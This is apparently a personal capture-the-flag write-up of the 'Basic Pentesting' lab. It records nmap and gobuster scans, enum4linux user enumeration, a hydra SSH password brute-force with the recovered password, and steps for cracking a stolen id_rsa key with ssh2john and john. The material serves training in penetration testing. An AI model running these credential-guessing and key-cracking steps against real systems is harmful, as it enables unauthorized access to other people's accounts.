# Basinc Pentesting

# Scanning
Nmap scan report for 10.10.72.158    
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)  
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))  
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
417/tcp   filtered onmux  
445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  
8009/tcp  open     ajp13       Apache Jserv (Protocol v1.3)  
8080/tcp  open     http        Apache Tomcat 9.0.7  
21571/tcp filtered unknown  
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel  <br>
Host script results:  <br>
|_clock-skew: mean: 1h19m59s, deviation: 2h18m35s, median: -1s  <br>
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  <br>
| smb-os-discovery:  <br>
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)  <br>
|   Computer name: basic2  <br>
|   NetBIOS computer name: BASIC2\x00  <br>
|   Domain name: \x00  <br>
|   FQDN: basic2  <br>
|_  System time: 2020-05-16T06:26:50-04:00  <br>
| smb-security-mode:  <br>
|   account_used: guest  <br>
|   authentication_level: user  <br>
|   challenge_response: supported  <br>
|_  message_signing: disabled (dangerous, but default)  <br>
| smb2-security-mode:  <br>
|   2.02:  <br>
|_    Message signing enabled but not required  <br>
| smb2-time:  <br>
|   date: 2020-05-16T10:26:50  <br>
|_  start_date: N/A  <br>

#Gobuster

##Gobuster Command : gobuster dir -u {ip} -w {password-list-path}

##Gobuster Result : <br>
Gobuster v3.0.1<br>
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)<br>
[+] Url:            http://10.10.72.158/<br>
[+] Threads:        10<br>
[+] Wordlist:       directory_guessing_list.txt<br>
[+] Status codes:   200,204,301,302,307,401,403<br>
[+] User Agent:     gobuster/3.0.1<br>
[+] Timeout:        10<br>

2020/05/16 19:42:16 Starting gobuster<br>
/development (Status: 301)<br>


# Samba installation in my mac
this is for enum4linx install guide.  

1. should be installed 'macport'

2. for samba installed command use this :
sudo port install bind9 gnutls readline talloc popt

3. after macport dependencies below command : 
sudo port install samba3

4. write the : /opt/local/etc/samba3/samba.conf. <br>
[Office Admin]. <br>
comment = Office Admin. <br> 
path = /Volumes/Server Data RAID/Office Admin. <br>
available = yes. <br>
guest ok = yes. <br>
create mask = 644. <br>
directory mask = 755. <br>
read only = no. <br>

# Samba Enumeration Result : 
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.  
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 16 22:08:45 2020  

 ==========================  
|    Target Information    |  
 ==========================  
Target ........... 10.10.28.75  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
...  
***S-1-22-1-1000 Unix User\kay (Local User)***<br>
***S-1-22-1-1001 Unix User\jan (Local User)***<br>

 ============================================  
|    Getting printer info for 10.10.28.75    |  
 ============================================  
No printers returned.  


# Password Guessing : 
## Command : hydra -l jan -P password-guessing-list.txt ssh://10.10.28.75/ <br> 

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-16 23:17:58  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is   recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task  
[DATA] attacking ssh://10.10.28.75:22/  


[STATUS] 142.00 tries/min, 142 tries in 00:01h, 14344256 to do in 1683:36h, 16 active  
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344062 to do in 2134:32h, 16 active  
[STATUS] 105.14 tries/min, 736 tries in 00:07h, 14343662 to do in 2273:41h, 16 active  
***[22][ssh] host: 10.10.28.75   login: jan   password: armando***<br>  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-16 23:25:25  

# Privilege Escalate 
Linpeas is privilege escalate tool<br>
[+] Linpeas <br>
  1. id_rsa copyit  
  2. ssh2john.py crack it    
  ./ssh2john.py /Users/scops/tools/hacking_project/thm/Basic_Pentesting/kay_id_rsa > forjohn.txt


# Using the john !
***How to use "john the ripper"*** <br>
john forjohn.txt --wordlist=/Users/scops/tools/password_guessing_list.txt <br>

